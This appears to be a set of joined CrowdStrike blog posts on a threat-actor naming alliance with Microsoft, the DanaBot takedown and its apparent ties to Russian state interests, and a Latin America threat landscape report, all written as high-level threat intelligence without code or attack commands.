The Vision
The alliance will help the industry better correlate threat actor aliases without imposing a single naming standard. It will grow in the future to include other organizations that also practice the art of attribution. 

The goal: deconflicting adversary names to build a cohesive and enduring mapping of existing naming systems to one another. In addition, where telemetry complements one another, there's an opportunity to extend attribution across more planes and vectors — building a richer, more accurate view of adversary campaigns that benefits the entire community.

How We’ll Get There
Enabling action: This collaboration isn’t just about aligning names — it’s about enabling action. By clarifying who is being referenced in threat reports, SOC analysts, incident responders, and CISOs can more quickly assess risk, prioritize response, and communicate with clarity across internal teams and external partners. Better alignment leads to faster decisions, and in cybersecurity, speed is a defensive advantage.
Aligning taxonomy: While each company maintains proprietary telemetry, we’ve demonstrated the value of analyst-driven collaboration to clarify overlaps and align naming across known threat actors. For example, through this effort we have successfully deconflicted more than 80 adversaries.
Working from the same sheet of music: As CrowdStrike and Microsoft align the adversaries tracked between the two companies, we’re building what many might call a "Rosetta Stone." This concept has been tried before, but largely has resulted in a single researcher or group of researchers tracking open source information and trying to make analytic judgments that what one company tracks is the same as what another company blogged about. This collaboration is different. Through mutual effort and analyst-led deconfliction, we will combine resources to maintain a mapping for the community and make it available to all those who engage these adversaries on the cyber battlefield. 
Providing organizational governance: As we build on this collaboration, we’re exploring a coordinated approach to maintain the mapping and engage trusted partners, starting with a small, focused contributor group. The working group will be led by Microsoft and CrowdStrike to ensure we bring the right partners together, define an analytic process for updating and maintaining attribution mappings as the threat landscape evolves, and ensure this intelligence is available to the broader community. 
CrowdStrike and Microsoft are proud to take the first step, but we know this must be a community-led initiative to succeed. Together, the companies have already deconflicted more than 80 threat actors through direct, analyst-led collaboration. These represent some of the most active and sophisticated adversaries in the world.

Below is a sample of the adversaries we’ve deconflicted to date, but this is just the beginning.  We look forward to expanding this work and inviting trusted contributors to join us, maintaining the mapping as adversaries evolve, and delivering clarity that empowers defenders at every level. 

Introduction
Effective collaboration is essential when confronting today's sophisticated cyber adversaries, particularly those operating with state tolerance or direction. At CrowdStrike, we routinely work alongside law enforcement agencies and industry partners to identify, monitor, and mitigate cyber threats. Recently, we provided technical assistance to the U.S. Department of Justice as part of a coordinated effort to disrupt the activities of individuals involved in developing, administering, and operating the DanaBot malware, tracked by CrowdStrike as SCULLY SPIDER.

The U.S. Defense Criminal Investigative Service (DCIS) seized the botnet's U.S.-based server infrastructure, effectively neutralizing the threat actor’s ability to issue commands to compromised systems. This seizure ensures that these command-and-control (C2) servers can no longer be used to direct, update, or otherwise manipulate the network of infected machines, cutting off the operators' control and preventing further malicious activities against victims.

This takedown represents more than just disrupting a criminal enterprise — it strikes at a cyber capability that has appeared to align with Russian government interests. In this blog, we examine how DanaBot exemplifies the blurred lines between Russian eCrime and state-sponsored cyber operations, highlighting why such takedowns are crucial in countering the broader Russian cyber threat.

The Russian Government-eCrime Nexus
SCULLY SPIDER is a Russia-based eCrime adversary known for developing and operating DanaBot as a malware-as-a-service (MaaS). Following DanaBot's debut in May 2018, it quickly gained popularity due to its modular functionality supporting credit card theft, wire fraud, and exfiltration of cryptocurrency-related files. What distinguishes DanaBot from typical eCrime operations, however, is the Russian government's tolerance of its activities. Despite having ample capability to investigate and prosecute these criminals operating within Russian borders, there is no public evidence authorities have taken legal action, a pattern that suggests these cybercriminals serve as proxy forces applying pressure on Western nations while maintaining plausible deniability for the Russian state.

DanaBot initially targeted victims in Ukraine, Poland, Italy, Germany, Austria, and Australia prior to expanding its targeting posture to include U.S.- and Canada-based financial institutions in October 2018. The malware's popularity grew due to its early modular development supporting Zeus-based web injects, information stealer capabilities, keystroke logging, screen recording, and hidden virtual network computing (HVNC) functionality. Between 2018 and 2021, DanaBot maintained its popularity as it gradually transitioned from banking trojan toward being leveraged as a distribution platform for other malware families.

Today, the U.S. Department of Justice unsealed an indictment against Russian nationals accused of developing, administering, and operating DanaBot. This announcement reveals insights into the intricacies of operating a modern eCrime MaaS that has served both criminal and state interests.

Supply Chain Attacks and Beyond
On October 22, 2021, a high-profile supply chain attack involving a compromised NPM package, ua-parser-js, distributed DanaBot — sub-botnet 40 — alongside XMRig.1 CrowdStrike Falcon® platform telemetry related to the incident indicated that DanaBot was observed in a wide range of sectors, including transportation, media, technology, and financial services.2 Two weeks after the October incident, on November 4, 2021, the same adversary leveraged another compromised NPM package, coa, to distribute DanaBot. At that time, the affected node package had 8.9 million weekly downloads, demonstrating the potential scale of impact from these operations.

Direct Support for Russian Military Operations
Evidence of DanaBot's alignment with Russian state interests emerged shortly after Russia's full-scale invasion of Ukraine. On March 2, 2022, DanaBot’s sub-botnet 5 received tasking to download a Delphi-based executable leveraged to conduct HTTP-based distributed denial-of-service (DDoS) attacks against the Ukrainian Ministry of Defence (MOD) webmail server. Following that activity, on March 7, 2022, the same sub-botnet was used to facilitate an HTTP-based DDoS attack against the National Security and Defense Council (NSDC) of Ukraine. The timing and targeting of these attacks suggest direct support of Russian military objectives, demonstrating how eCrime infrastructure can be rapidly repurposed for state-aligned disruptive operations.

Espionage Activities Revealed
Perhaps most significantly, the DOJ indictment reveals that two DanaBot sub-botnets, 24 and 25, were specifically utilized for espionage purposes. Though it is unclear how the collected data was used, we think this direct use of criminal infrastructure for intelligence gathering activities provides evidence that SCULLY SPIDER operators were acting on behalf of Russian government interests. Such dual use of criminal infrastructure for state espionage represents a cornerstone of Russia's hybrid cyber strategy, allowing the government to maintain distance from operations while benefiting from their outcomes.

Continuous Adaptation to Serve Multiple Masters
Since 2022, SCULLY SPIDER has annually restructured their product offering to adapt to changes in the eCrime ecosystem, primarily adjusting the pricing of their services offered. Additionally, the adversary has continued to refactor the DanaBot codebase, emphasizing defense evasion. This is best highlighted by multiple updates to the malware's proprietary binary C2 protocol since July 2022. These adaptations have been key to the adversary’s sustained success in serving both criminal clients and state interests.

Conclusion
The takedown of DanaBot represents a significant blow not just to an eCrime operation but to a cyber capability that has appeared to align Russian government interests. The case of SCULLY SPIDER highlights why we must view certain Russian eCrime groups through a political lens — as extensions of state power rather than mere criminal enterprises. The Russian government's tolerance of these actors, the direct use of DanaBot in attacks supporting Russia's invasion of Ukraine, and the revelation of espionage-focused sub-botnets all suggest a calculated strategy of leveraging criminal proxies for state objectives. This takedown demonstrates the critical importance of public-private partnerships in not just disrupting financially motivated cybercrime but in countering the broader Russian cyber threat that blends criminal and state-sponsored activities. As we continue to face such hybrid threats, identifying and disrupting these dual-purpose cyber capabilities remains essential to protecting our digital ecosystem from both criminal exploitation and geopolitical weaponization.

Latin America has quickly become a hotspot for cyber activity. The region’s rapid digitalization, expanding cloud adoption, and evolving geopolitical friction have drawn the attention of both financially motivated eCrime actors and strategic nation-state adversaries.

The CrowdStrike 2025 Latin America Threat Landscape Report provides key insights into cyber activity across Central and South America, Mexico, and the Caribbean. In its pages, CrowdStrike Counter Adversary Operations team details the eCrime activity, targeted intrusions, hacktivist disruptions, and cyber espionage targeting organizations in the region.

For organizations operating in or connected to Latin America, understanding this activity is critical to defending against it. This intelligence-driven deep dive provides information that security teams need to navigate the region’s changing threat landscape.

Global and Regional eCrime Proliferate 
CrowdStrike currently tracks six named adversaries — OCULAR SPIDER, BLIND SPIDER, ODYSSEY SPIDER, PLUMP SPIDER, SAMBA SPIDER, and SQUAB SPIDER — either based in or primarily targeting Latin America. To evade detection, LATAM-focused threat actors continue to prioritize defense evasion by adopting novel tactics, techniques, and procedures (TTPs), including using newer programming languages such as Rust. This activity highlights threat actors’ interest in adapting to the current eCrime ecosystem.

Big game hunting (BGH) adversaries increasingly targeted the region. CrowdStrike Intelligence documented 291 LATAM-based victims named on data extortion and ransomware leak sites. Though this only represents roughly 5% of the 5,276 globally documented incidents, it marks a 15% increase over the 254 documented incidents in the region in 2023. No evidence suggests BGH adversaries target the LATAM region to the same extent as North America and Europe.

BGH adversaries often collaborate with access brokers, who gain and sell access to target networks. In 2024, 107 access brokers advertised network access to 428 LATAM-based entities. These entities were predominantly located in Brazil, Mexico, Colombia, Argentina, and Peru — the five most ransomware-affected LATAM countries. Notably, the cost of initial access has declined significantly, with average access broker prices dropping by 60% from 2023 to 2024.

Supporting this cybercrime activity is an active regional underground. The CrowdStrike Intelligence team observed Telegram forums catering to Spanish-speaking users and recovered more than 1 billion credentials belonging to LATAM-based individuals and organizations related to data leaks and malware stealer logs. LATAM eCrime adversaries also run their own forums and websites.

Nation-State Intrusions: China and DPRK Take Aim
While most attacks were criminal in nature, China-nexus adversaries were the most active nation-state threat in the region. Since 2019, VIXEN PANDA has targeted government organizations and non-government organizations in several countries in the LATAM region. LIMINAL PANDA, which primarily targets telecom networks highly likely to support intelligence collection efforts, likely gained access to telecom providers in Central and South America.

AQUATIC PANDA, attributed to a Chinese contractor, has likely targeted South America-based entities from 2022 to 2024. In 2022, the adversary likely targeted email servers belonging to government and telecom entities in South America. In 2023, they likely conducted reconnaissance against entities in Brazil. Evidence also indicates AQUATIC PANDA has targeted military entities in Peru.

These campaigns align closely with Beijing’s strategic objectives: intelligence collection, political influence, and technological expansion.

Over the past year, CrowdStrike Intelligence also observed DPRK-nexus adversaries FAMOUS CHOLLIMA, SILENT CHOLLIMA, and STARDUST CHOLLIMA conduct likely opportunistic campaigns in the LATAM region for financial gain and, less frequently, cyber espionage.

An example: Last year, CrowdStrike observed FAMOUS CHOLLIMA activity in Argentina, Brazil, and Uruguay. The adversary illicitly obtained freelance or full-time equivalent work to earn money that could be funneled to North Korea. While employed, these insiders can also collect information that could likely be used for technological and defense-related development.

Hacktivism Mirrors Regional and Global Tensions
Throughout 2024, CrowdStrike observed a variety of ideologically driven cyber operations impacting the public and private sectors across Latin America and the Caribbean. Many of these activities were linked to geopolitical events or perceived governance issues, echoing historical patterns of protest and activism.

Global groups, such as the Anonymous-affiliated GhostSec and others, claimed operations timed with major political milestones such as the Venezuelan presidential election and civil protests in Cuba and Guatemala. These actions often targeted government-affiliated infrastructure, signaling support for domestic movements or drawing attention to broader causes.

While the scope and impact of these campaigns vary, they collectively underscore how regional dynamics and global conflicts are shaping hacktivist motivations and targeting behavior in Latin America. Organizations operating in the region should remain mindful of these actors, both as potential disruptors and as barometers of underlying societal and political tensions.

Latin America is now a focal point for eCrime innovation, espionage, and ideological disruption. The CrowdStrike 2025 Latin America Threat Landscape Report offers a detailed roadmap of how adversaries are evolving in the region and what security leaders must do to stay ahead. The report is available in English, Spanish, and Portuguese.
